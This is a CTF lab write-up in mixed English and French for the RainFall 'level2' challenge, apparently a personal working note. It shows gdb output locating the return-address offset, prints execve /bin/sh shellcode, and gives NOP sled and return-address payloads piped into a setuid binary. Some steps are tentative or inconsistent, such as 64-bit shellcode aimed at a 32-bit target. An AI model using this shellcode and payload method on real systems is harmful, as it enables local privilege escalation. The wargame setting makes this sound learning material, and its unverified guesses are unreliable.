First let's look at the type of the file

```console
level2@RainFall:~$ file level2 
level2: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x0b5bb6cdcf572505f066c42f7be2fde7c53dc8bc, not stripped
```

with buffer overflow pattern generator we see that the offset is at 80 --> pas sur de ca 

explication il faut trouver le nombre de byte pour overwrite EIP car il pointe sur la return adresse de p(), en envoyant 80 on overwrite EBP mais pas EIP
```console
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0xb7ea912f in ?? () from /lib/i386-linux-gnu/libc.so.6
(gdb) info registers
ebp            0x41414141	0x41414141
eip            0xb7ea912f	0xb7ea912f
```
EIP se trouve toujours a EBP + 4 car il point sur la return adresse, donc si on relance le meme proceder avec 84 A
```
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level2/level2 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) info registers
ebp            0x41414141	0x41414141
eip            0x41414141	0x41414141
```

41 etant l'hexa pour le A majuscule

```
"\x48\x31\xd2"                                  // xor    %rdx, %rdx
"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // mov	$0x68732f6e69622f2f, %rbx
"\x48\xc1\xeb\x08"                              // shr    $0x8, %rbx
"\x53"                                          // push   %rbx
"\x48\x89\xe7"                                  // mov    %rsp, %rdi
"\x50"                                          // push   %rax
"\x57"                                          // push   %rdi
"\x48\x89\xe6"                                  // mov    %rsp, %rsi
"\xb0\x3b"                                      // mov    $0x3b, %al
"\x0f\x05";     
```

```console

PAYLOAD --> 84 bytes long
RET ADDRESS -> 10 * 4 bytes long = 40 '0xbffff6fa' \xbf\xff\xf6\xfa --> peut etre a reverse donc \xfa\xf6\xff\xbf
0xbffff6ea -> \xea\xf6\xff\xbf
SHELLCODE -> 30 bytes
NOP -> 10 bytes 84 - 40 - 30 = 14 * '\x90'
print NOP + SHELLCODE + RET
```



```
OLD SHELLCODE
"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

```

```
(python -c 'print ("\x90" * 14 + "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05" + "\xea\xf6\xff\xbf" * 10)'; cat) | ./level2

(python -c 'print ("\x90" * 14 + "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05" + "\xbf\xff\xf6\xfa" * 10)'; cat) | ./level2

----------------------------------------------------------------------------

```console
NEW SHELLCODE
char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
```

```
PAYLOAD TOTAL = 84 bytes
RET ADDRESS = 4 bytes
SHELLCODE = 23 bytes
NOP = 84 - 23 - 4 = 57 bytes

RET = "\xea\xf6\xff\xbf"

0xbffff6ea -> "\xea\xf6\xff\xbf"
(ou 0xbffff6da? smaller)
( 0xbffff71a ? bigger) --> "\x1a\xf7\xff\xbf"

NOPE = "\x90" * 57

\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\xea\xf6\xff\xbf

NOP + shellcode + ret
```

```
(python -c 'print( "\x90" * 57 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x1a\xf7\xff\xbf" ) '; cat) | ./level2
```

now we have to find the shellcode to execute a shell inside the program
